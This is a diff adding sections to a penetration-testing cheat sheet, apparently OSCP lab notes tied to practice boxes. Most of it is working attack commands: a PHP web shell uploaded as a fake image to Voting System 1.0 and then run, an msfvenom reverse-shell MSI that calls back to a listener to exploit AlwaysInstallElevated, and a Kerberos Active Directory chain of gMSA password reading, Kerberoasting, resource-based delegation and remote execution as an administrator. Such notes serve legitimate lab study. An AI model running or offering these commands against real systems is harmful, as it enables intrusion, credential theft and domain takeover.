@@ -176,6 +176,23 @@ gpp-decrypt "$(awk -F'cpassword=\"' '{print $2}' $BoxDir/loot/Replication/Polici
 ssh $Username@$BoxIP
 ftp $BoxIP
 
+# IoT product fingerprint and controlled factory-credential validation
+curl -sS -i "http://$BoxIP:$WebPort/" | tee "$BoxDir/loot/http-root.txt"
+curl -sS -L "http://$BoxIP:$WebPort/admin/" | tee "$BoxDir/loot/http-admin.html"
+grep -Ein 'product|version|firmware|login|admin|pi-hole' \
+  "$BoxDir/loot/http-root.txt" "$BoxDir/loot/http-admin.html"
+ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no \
+  -p "$SshPort" "$Username@$BoxIP"
+id; whoami; hostname
+
+# Mounted-media metadata only. Do not print private completion files.
+mount | grep -E '/media|/mnt|/dev/sd'
+lsblk -f
+df -h
+ls -la "$UsbMount"
+file -s "$UsbDevice"
+stat "$UsbMount"/* 2>/dev/null
+
 # PostgreSQL default login
 psql -h $BoxIP -p $Port -U postgres
 mysql -u $Username -p$Password -h $BoxIP -P $Port
@@ -314,7 +331,21 @@ curl -s "http://$BoxIP/nibbleblog/content/private/plugins/my_image/image.php"
 curl -s -X POST "http://$BoxIP/$UploadPath" -F "file=@$BoxDir/$Archive" -F "submit=Upload"
 # Enumerate an archive layout before using it as a CMS plugin or theme
 unzip -l $BoxDir/$Archive
+
+# Love: authenticated Voting System 1.0 voter-photo upload
+cat > "$BoxDir/exploits/probe.php" <<'EOF'
+<?php echo shell_exec($_GET["cmd"]); ?>
+EOF
+curl -sS -i -b "$CookieFile" \\
+  -F "photo=@$BoxDir/exploits/probe.php;type=image/png" \\
+  --form-string 'firstname=a' --form-string 'lastname=b' \\
+  --form-string 'password=1' --form-string 'add=' \\
+  "http://$BoxIP/Admin/voters_add.php"
+curl -sS -G --data-urlencode 'cmd=whoami' \\
+  "http://$BoxIP/images/probe.php"
 ```
+
+The upload redirect is not proof of execution. Verify the calculated `/images/probe.php` path and look for the web-service identity. The multipart MIME type is declared as an image while the filename remains PHP, matching the reviewed handler behavior. Seen in [[OSCP/BOXES/WRITE UPS/Windows/Love|Love]].
 
 ### ANONYMOUS FTP TO IIS CLASSIC ASP
 
@@ -851,6 +882,12 @@ net localgroup administrators $Username /delete
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 
+# AlwaysInstallElevated reverse shell MSI: both values must be 1
+msfvenom -p windows/x64/shell_reverse_tcp \\
+  LHOST=$LocalIP LPORT=$Port2 -f msi -o $BoxDir/www/system-shell.msi
+nc -lvnp $Port2
+msiexec /quiet /qn /i C:\Windows\Temp\system-shell.msi
+
 # Run a process with alternate credentials when WinRM or RDP is unavailable
 .\RunasCs.exe $Username2 $Password2 "cmd /c whoami"
 
@@ -1000,6 +1037,44 @@ netexec winrm $DCip -u Administrator -H $NTHash -d $Domain -x 'whoami && hostnam
 ```
 
 Fermion also reinforces two checks before escalation: inspect exported scheduled-task XML, confirm the task is registered, and query Winlogon for readable autologon values when the advertised trigger is absent.
+
+## Vintage chain quick reference
+
+```bash
+# Kerberos-only assumed breach: obtain and validate a TGT.
+getTGT.py "$Domain/$Username:$Password" -dc-ip $BoxIP
+KRB5CCNAME=$BoxDir/loot/$Username.ccache \
+  nxc smb $FQDN -d $Domain -k --use-kcache --kdcHost $BoxIP
+
+# Collect AD relationships without NTLM.
+KRB5CCNAME=$BoxDir/loot/$Username.ccache \
+  bloodhound-python -u $Username -d $Domain -k -no-pass \
+  --auth-method kerberos -ns $BoxIP -dc $FQDN -c All --zip
+
+# Pre-created computer account and gMSA path.
+getTGT.py "$Domain/$MachineAccount:$MachinePassword" -dc-ip $BoxIP
+bloodyAD -d $Domain -u "$MachineAccount" -k \
+  ccache=$BoxDir/loot/$MachineAccount.ccache kdc=$BoxIP \
+  -H $FQDN -i $BoxIP get object "$GMSAAccount" \
+  --attr msDS-ManagedPassword --raw
+
+# Targeted SPN request after the gMSA/group change and TGT renewal.
+GetUserSPNs.py "$Domain/$GMSAAccount" -k -no-pass -dc-ip $BoxIP \
+  -usersfile $BoxDir/loot/spn-targets.txt \
+  -outputfile $BoxDir/loot/kerberoast.hashes
+
+# Group-based RBCD: add the controlled machine to the already trusted group.
+bloodyAD -d $Domain -u $Username3 -k \
+  ccache=$BoxDir/loot/$Username3.ccache kdc=$BoxIP \
+  -H $FQDN -i $BoxIP add groupMember $DelegatedGroup '$MachineAccount'
+getTGT.py "$Domain/$MachineAccount:$MachinePassword" -dc-ip $BoxIP
+getST.py -spn "cifs/$FQDN" -impersonate $AdminUser \
+  -k -no-pass -dc-ip $BoxIP "$Domain/$MachineAccount"
+KRB5CCNAME=$BoxDir/loot/$AdminUser.ccache \
+  wmiexec.py -k -no-pass "$Domain/$AdminUser@$FQDN" 'whoami'
+```
+
+Vintage-specific gotchas: NTLM was disabled; membership changes required fresh tickets; `GetUserSPNs.py` needed an exact target file; DPAPI needed the correct masterkey/blob mapping and `0x` prefix; and `L.Bianchi_adm` was used for the final delegated service because the built-in Administrator route returned `STATUS_LOGON_TYPE_NOT_GRANTED`. See [[OSCP/BOXES/WRITE UPS/AD/Vintage|Vintage]].
 
 ## 13. PASSWORD ATTACKS
 
